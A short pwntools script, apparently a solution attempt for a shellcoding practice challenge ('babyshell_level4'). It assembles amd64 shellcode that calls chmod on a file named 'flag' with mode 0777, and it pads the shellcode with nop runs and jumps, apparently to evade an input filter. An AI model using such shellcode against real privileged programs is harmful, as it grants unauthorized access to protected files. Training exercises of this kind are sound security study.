from  pwn import *
context.arch = "amd64"
context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

my_sc = asm(
'''
mov rbx, 0x67616c66
jmp lab1
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
lab1:
push rbx
mov rax, 0x5a
jmp lab2
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
lab2:
mov rdi, rsp
jmp lab3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
lab3:
mov rsi, 0x1ff
syscall

'''
)
# display the bytes
print(disasm(my_sc))
fd = open("ttt-raw","wb+")
fd.write(my_sc)
fd.close()
#p = gdb.debug("/challenge/babyshell_level4")
#p.send(my_sc)
#p.interactive()